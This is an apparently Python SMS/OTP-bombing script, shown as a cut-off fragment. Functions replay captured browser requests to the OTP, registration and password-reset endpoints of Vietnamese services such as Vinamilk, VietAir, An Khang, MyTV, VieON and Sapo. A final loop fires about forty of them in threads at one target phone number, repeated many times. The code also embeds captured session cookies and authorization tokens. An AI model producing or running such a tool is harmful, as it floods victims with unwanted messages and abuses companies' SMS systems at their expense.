    'Content-Type': 'application/json',
    'Origin': 'https://mutosi.com',
    'Pragma': 'no-cache',
    'Referer': 'https://mutosi.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'phone': phone,
    'token': bien_global,
    'source': 'web_consumers',
}

    response = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data)
def vinamilk(phone):
    cookies = {
    '_gcl_au': '1.1.998139933.1720624574',
    '_ga': 'GA1.1.50287730.1720624578',
    '_fbp': 'fb.2.1720624579398.521085014509551541',
    '_tt_enable_cookie': '1',
    '_ttp': 'KSqjH4dgnlCZCXFrW8iH9-PBbVv',
    '_gcl_gs': '2.1.k1$i1720624593',
    '_gcl_aw': 'GCL.1720624597.CjwKCAjw4ri0BhAvEiwA8oo6F2TkUVdatYI4tVOobGswn40OdeGgXIg6LXx5FNTWp7uUoRTyudcm1hoCI04QAvD_BwE',
    '_hjSessionUser_2067180': 'eyJpZCI6IjdhM2IwZGI1LTAyYzUtNTk0YS1hYWIxLTUxNGFhMjEzYmMwNyIsImNyZWF0ZWQiOjE3MjA2MjQ1Nzk1NjAsImV4aXN0aW5nIjp0cnVlfQ==',
    'ci_session': 'a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%223d8858bedb9f88174683e7216ae7f4de%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A111%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721111592%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D5be85c0c1450958dd4ed204579b830aa',
    '_hjSession_2067180': 'eyJpZCI6IjJiMDkwNzRmLTA2M2YtNDNkOC1hYzljLTk1ZTM4MDU3ODA5NSIsImMiOjE3MjExMTE1OTU0NzgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=',
    '_clck': '1sxln5m%7C2%7Cfni%7C0%7C1652',
    '__cf_bm': 'lBreB9n2Kjxr5GDN12Z6cP1PU2TCNww1w8ccXp5bzus-1721111653-1.0.1.1-tG3rISwY9rhAXjyBqH8rYZTCWOA9POhBSf1D0X0bFyRdMUnR9K7cmCgu05Xxiho3.bxM00TNCyc6lQ8OcpEhcA',
    'builderSessionId': '7b564e5635c64aa4b60d611b650e05b4',
    'sca_fg_codes': '[]',
    'avadaIsLogin': '',
    '_ga_6NH1HJ4MRS': 'GS1.1.1721111594.2.1.1721111671.44.0.0',
    '_clsk': '1q6ggsm%7C1721111672278%7C4%7C1%7Cv.clarity.ms%2Fcollect',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer null',
    'cache-control': 'no-cache',
    'content-type': 'text/plain;charset=UTF-8',
    # 'cookie': '_gcl_au=1.1.998139933.1720624574; _ga=GA1.1.50287730.1720624578; _fbp=fb.2.1720624579398.521085014509551541; _tt_enable_cookie=1; _ttp=KSqjH4dgnlCZCXFrW8iH9-PBbVv; _gcl_gs=2.1.k1$i1720624593; _gcl_aw=GCL.1720624597.CjwKCAjw4ri0BhAvEiwA8oo6F2TkUVdatYI4tVOobGswn40OdeGgXIg6LXx5FNTWp7uUoRTyudcm1hoCI04QAvD_BwE; _hjSessionUser_2067180=eyJpZCI6IjdhM2IwZGI1LTAyYzUtNTk0YS1hYWIxLTUxNGFhMjEzYmMwNyIsImNyZWF0ZWQiOjE3MjA2MjQ1Nzk1NjAsImV4aXN0aW5nIjp0cnVlfQ==; ci_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%223d8858bedb9f88174683e7216ae7f4de%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A111%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721111592%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D5be85c0c1450958dd4ed204579b830aa; _hjSession_2067180=eyJpZCI6IjJiMDkwNzRmLTA2M2YtNDNkOC1hYzljLTk1ZTM4MDU3ODA5NSIsImMiOjE3MjExMTE1OTU0NzgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; _clck=1sxln5m%7C2%7Cfni%7C0%7C1652; __cf_bm=lBreB9n2Kjxr5GDN12Z6cP1PU2TCNww1w8ccXp5bzus-1721111653-1.0.1.1-tG3rISwY9rhAXjyBqH8rYZTCWOA9POhBSf1D0X0bFyRdMUnR9K7cmCgu05Xxiho3.bxM00TNCyc6lQ8OcpEhcA; builderSessionId=7b564e5635c64aa4b60d611b650e05b4; sca_fg_codes=[]; avadaIsLogin=; _ga_6NH1HJ4MRS=GS1.1.1721111594.2.1.1721111671.44.0.0; _clsk=1q6ggsm%7C1721111672278%7C4%7C1%7Cv.clarity.ms%2Fcollect',
    'origin': 'https://new.vinamilk.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://new.vinamilk.com.vn/account/register',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    data = '{"type":"register","phone":"' + phone + '"}'

    response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', cookies=cookies, headers=headers, data=data)
def air(phone):
    referer_url = f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&mobile={phone}'
    
    cookies = {
        '_gcl_au': '1.1.515899722.1720625176',
        '_tt_enable_cookie': '1',
        '_ttp': 't-FL-whNfDCNGHd27aF7syOqRSh',
        '_fbp': 'fb.2.1720625180842.882992170348492798',
        '__zi': '3000.SSZzejyD3jSkdkgYo5SCqJ6U_wE7LLZFVv3duDj7Kj1jqlNsoWH8boBGzBYF0KELBTUwk8y31v8gtBUuYWuBa0.1',
        '_gid': 'GA1.3.1511312052.1721112193',
        '_clck': '1eg7brl%7C2%7Cfni%7C0%7C1652',
        '_ga': 'GA1.1.186819165.1720625180',
        '_ga_R4WM78RL0C': 'GS1.1.1721112192.2.1.1721112216.36.0.0',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://vietair.com.vn',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': referer_url,
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'op': 'PACKAGE_HTTP_POST',
        'path_ajax_post': '/service03/sms/get',
        'package_name': 'PK_FD_SMS_OTP',
        'object_name': 'INS',
        'P_MOBILE': phone,
        'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
    }

    response = requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx', cookies=cookies, headers=headers, data=data)
def ankhang(phone):
  cookies = {
    'TBMCookie_3209819802479625248': '353131001723795631CcRX0BYOlmkc1IPLpTU4tnZtUfM=',
    '___utmvm': '###########',
    '.AspNetCore.Antiforgery.PgYZnA9bRvk': 'CfDJ8EdA4dOuO4JPsAKuwB0RdpELj6bE5DYFjIIWPYOrJc9c1ouVS2SDuAxN5KHapmBp4Dvnf_IQQ6UoWRrDQx9e1djcy9hznEIsHjWC3--SQteWFRFBtNniNTlosueH9KdFoUSlJGUAmx5WOGCoWDppFhs',
    'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22HasLocation%22%3Afalse%7D',
    'MWG_PRODUCT_BASIC_DB': 'wQBv%2Flddu8LiOok8oRT2oX26hhQ6G%2FSBYM69B6hhPt6Ck4RDYjEqzA--',
    'MWG_CART_HAVE_PRODUCT': '',
    'MWG_CART_SS_10': 'CfDJ8HejTqTgEXlOoIeW1CutofPgiu0ZdV4%2FzJNwCHjwlSPLdAp22DSpbAlIv4glWbzk88%2FFXwToeZVCg%2BJ9gAn%2BcHa69EPHJaOehz36DBNvig5Svp34fzK7%2BPWHFeuUvYFPUdh%2F32YxbF1KrjLa9J%2FuPl1pHE13r0zE0bTiIMmAMSxM',
    '_gcl_au': '1.1.1604051076.1723795652',
    '_ce.irv': 'new',
    'cebs': '1',
    '_ce.clock_event': '1',
    '_fbp': 'fb.1.1723795652424.385946749816975689',
    '_ce.clock_data': '60%2C43.159.48.133%2C1%2C362d7fe3d8b2581bffa359f0eeda7106%2CChrome%2CSG',
    '_ga': 'GA1.1.287992304.1723795653',
    '_pk_id.2.b94a': 'b4e1715133990e2f.1723795653.',
    '_pk_ses.2.b94a': '1',
    '__zi': '2000.SSZzejyD5jOgdlk_qHeVpIwL-x_TN1tC99cqyi0I4zHcnQRutW1Hnd3NgQRN0ngCUzUheje05y9_qA3jt0uGnttQfUyv.1',
    '_tt_enable_cookie': '1',
    '_ttp': 'ZA5jgZWM7g8qMtYD9IdtILwgDzp',
    'SvID': 'ak211|Zr8I4|Zr8Is',
    '.AspNetCore.Antiforgery.NTCLGRwicAo': 'CfDJ8AOPS3HyLgBFlxCZc71KlZMSxU07qAEKdyoIjE1UNx22vgM00mZtXkNgzktITFsY6uuYGTCBB-lNTqTS1BVnIP01u6nz63cvXWZ9m7Pk_aY1Zr3IDytAE3ejY0pCHRjlJbCSvp-7vrCaydAjD2nJLu8',
    'cebsp_': '2',
    '_ce.s': 'v~4bcbf40a7f7995b33116ee48b6c34e2853d48d97~lcw~1723795755564~lva~1723795652036~vpv~0~v11.fhb~1723795652442~v11.lhb~1723795652443~v11.cs~403690~v11.s~96ccd600-5ba6-11ef-b077-75535f8bf8f6~v11.sla~1723795756277~lcw~1723795756277',
    '_ga_D1DPPSN7B8': 'GS1.1.1723795652.1.1.1723795756.50.0.0',
}
  headers = {
    'Accept': '*/*',
    'Accept-Language': 'en,zh-CN;q=0.9,zh;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'TBMCookie_3209819802479625248=353131001723795631CcRX0BYOlmkc1IPLpTU4tnZtUfM=; ___utmvm=###########; .AspNetCore.Antiforgery.PgYZnA9bRvk=CfDJ8EdA4dOuO4JPsAKuwB0RdpELj6bE5DYFjIIWPYOrJc9c1ouVS2SDuAxN5KHapmBp4Dvnf_IQQ6UoWRrDQx9e1djcy9hznEIsHjWC3--SQteWFRFBtNniNTlosueH9KdFoUSlJGUAmx5WOGCoWDppFhs; DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22HasLocation%22%3Afalse%7D; MWG_PRODUCT_BASIC_DB=wQBv%2Flddu8LiOok8oRT2oX26hhQ6G%2FSBYM69B6hhPt6Ck4RDYjEqzA--; MWG_CART_HAVE_PRODUCT=; MWG_CART_SS_10=CfDJ8HejTqTgEXlOoIeW1CutofPgiu0ZdV4%2FzJNwCHjwlSPLdAp22DSpbAlIv4glWbzk88%2FFXwToeZVCg%2BJ9gAn%2BcHa69EPHJaOehz36DBNvig5Svp34fzK7%2BPWHFeuUvYFPUdh%2F32YxbF1KrjLa9J%2FuPl1pHE13r0zE0bTiIMmAMSxM; _gcl_au=1.1.1604051076.1723795652; _ce.irv=new; cebs=1; _ce.clock_event=1; _fbp=fb.1.1723795652424.385946749816975689; _ce.clock_data=60%2C43.159.48.133%2C1%2C362d7fe3d8b2581bffa359f0eeda7106%2CChrome%2CSG; _ga=GA1.1.287992304.1723795653; _pk_id.2.b94a=b4e1715133990e2f.1723795653.; _pk_ses.2.b94a=1; __zi=2000.SSZzejyD5jOgdlk_qHeVpIwL-x_TN1tC99cqyi0I4zHcnQRutW1Hnd3NgQRN0ngCUzUheje05y9_qA3jt0uGnttQfUyv.1; _tt_enable_cookie=1; _ttp=ZA5jgZWM7g8qMtYD9IdtILwgDzp; SvID=ak211|Zr8I4|Zr8Is; .AspNetCore.Antiforgery.NTCLGRwicAo=CfDJ8AOPS3HyLgBFlxCZc71KlZMSxU07qAEKdyoIjE1UNx22vgM00mZtXkNgzktITFsY6uuYGTCBB-lNTqTS1BVnIP01u6nz63cvXWZ9m7Pk_aY1Zr3IDytAE3ejY0pCHRjlJbCSvp-7vrCaydAjD2nJLu8; cebsp_=2; _ce.s=v~4bcbf40a7f7995b33116ee48b6c34e2853d48d97~lcw~1723795755564~lva~1723795652036~vpv~0~v11.fhb~1723795652442~v11.lhb~1723795652443~v11.cs~403690~v11.s~96ccd600-5ba6-11ef-b077-75535f8bf8f6~v11.sla~1723795756277~lcw~1723795756277; _ga_D1DPPSN7B8=GS1.1.1723795652.1.1.1723795756.50.0.0',
    'Origin': 'https://www.nhathuocankhang.com',
    'Referer': 'https://www.nhathuocankhang.com/lich-su-mua-hang/dang-nhap',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}
  data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8AOPS3HyLgBFlxCZc71KlZM4jQU9OK9b1DUn5ys7aKZViPrpybaiUbsmuKMJZcke6CgT4eDk1wOuPCfN7avFnvLJT8N7pjy_N5nG17FGesjJq1photurB6sAQ50kCSSxPXPyi6lg7uUQRHgvO6fG9Ak',
}
  response = requests.post(
    'https://www.nhathuocankhang.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
    )
def mytv(phone):
  header = {
    'Host':'apigw.mytv.vn',
'Connection':'keep-alive',
'Content-Length':'59',
'sec-ch-ua':'"Not A(Brand";v="99", "Android WebView";v="121", "Chromium";v="121"',
'Accept-Language':'vi',
'manufacturer_id':'1fad3e8bcb570aae4c11d14d05665c83',
'sec-ch-ua-mobile':'?1',
'Authorization':'Basic eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtYW51ZmFjdHVyZXJfaWQiOiIxZmFkM2U4YmNiNTcwYWFlNGMxMWQxNGQwNTY2NWM4MyIsIm1lbWJlcl9pZCI6ImFub255bW91cy0xZmFkM2U4YmNiNTcwYWFlNGMxMWQxNGQwNTY2NWM4MyIsImlhdCI6MTcyMzk2NTEwOX0.laSLh-Wr06wPwgraLP4sc8UWDsfJqhhyczjP8zQhlRo',
'bypass':'1',
'Content-Type':'application/json',
'Access-Control-Allow-Origin':'*',
'Accept':'application/json, text/plain, */*',
'macaddress':'d7da552a96c542df59271e845bb94cb1',
'withCredentials':'true',
'User-Agent':'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.144 Mobile Safari/537.36',
'sec-ch-ua-platform':"Android",
'Origin':'https://mytv.com.vn',
'X-Requested-With':'mark.via.gp',
'Sec-Fetch-Site':'cross-site',
'Sec-Fetch-Mode':'cors',
'Sec-Fetch-Dest':'empty',
'Referer':'https://mytv.com.vn/',
'Accept-Encoding':'gzip, deflate, br, zstd',

  }
  data = '{"login_type":1,"email":null,"phone":"sdt","type":2}'.replace("sdt",phone)
  rq = requests.post("https://apigw.mytv.vn/api/v1/authen-handle/sendOTP?&uuid=8665f570b8e81f88a1db4ec8a6d19be5&time=2024y08m18d_14h13m46s105ms",headers=header,data=data).text
def vieon(sdt):
  headers = {
    'Host': 'api.vieon.vn',
    # 'content-length': '225',
    'accept': 'application/json, text/plain, */*',
    'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTM4MzU2OTgsImp0aSI6IjRjYTdmMTBiYjk2MTUzNjZjNzUxYjRmNGFjNjY3ZTZiIiwiYXVkIjoiIiwiaWF0IjoxNjkzNjYyODk4LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY5MzY2Mjg5Nywic3ViIjoiYW5vbnltb3VzXzU3ZjNmZmQ3N2FkMjA5YTYyNmMxZWE2MDdkMGM0Nzc1LWNkOWI3MDM1MDZlMWRlMDU3M2NhMDRjNjY2YzFiNjZkLTE2OTM2NjI4OTgiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiNTdmM2ZmZDc3YWQyMDlhNjI2YzFlYTYwN2QwYzQ3NzUtY2Q5YjcwMzUwNmUxZGUwNTczY2EwNGM2NjZjMWI2NmQtMTY5MzY2Mjg5OCIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMS4wOyBDUEgxODAzIEJ1aWxkL09QTTEuMTcxMDE5LjAyNikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNi4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsImR0IjoibW9iaWxlX3dlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiQW5kcm9pZCA4LjEuMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.fQERPMuQAu0FKAm7xTBECSNxeDJlhGyKwy4C-TUU-JI',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://vieon.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://vieon.vn/',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  params = {
    'platform': 'mobile_web',
    'ui': '012021',
  }
  data = '{"username":"sdt","country_code":"VN","model":"Android 8.1.0","device_id":"9e69bde1931392d0f6c7a56650d82e3d","device_name":"Chrome/121","device_type":"desktop","platform":"mobile_web","ui":"012021"}'.replace("sdt",sdt)
  response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, data=data).text
  
def sapo(phone):
    headers = {
      'Host':'accounts.sapo.vn',
'content-length':'131',
'sec-ch-ua':'"Not A(Brand";v="99", "Android WebView";v="121", "Chromium";v="121"',
'accept':'application/json, text/javascript, */*; q=0.01',
'content-type':'application/json',
'x-requested-with':'XMLHttpRequest',
'sec-ch-ua-mobile':'?1',
'user-agent':'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.144 Mobile Safari/537.36',
'sec-ch-ua-platform':'"Android"',
'origin':'https://accounts.sapo.vn',
'sec-fetch-site':'same-origin',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://accounts.sapo.vn/register/confirm?t=rHEYbHr6Sd4CMhZMl2d46tvDWp2e0gCMJv8U&lang=vi',
'accept-encoding':'gzip, deflate, br, zstd',
'accept-language':'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',

    }

    data = '{"country_code":"84","phone_number":"sdt","type":"REQUEST_REGISTER","register_token":"rHEYbHr6Sd4CMhZMl2d46tvDWp2e0gCMJv8U"}'.replace("sdt",phone)

    response = requests.post('https://accounts.sapo.vn/otp/send', headers=headers, data=data).text
# chạy
ham = [myvt,tv360,phuclong,fm,robot,batdongsan,dvcd,mocha,fptshop,blu,tgdt,concung,best_inc,winmart,emart,vayvnd,kingz,ghn,gala,lon,medicare,lote,hsv_tech,vato,beauty,hoanvu,tokyo,vtpost,shine,dkimu,otpmu,vinamilk,air,beecow,ecogreen,medigoapp,ankhang,mytv,vieon,sapo]
def mainn(phone,amount):
  for i in range(amount):
    for i in ham:
      threading.submit(i,phone)
      time.sleep(tgian)
    




mainn(phone,amount)
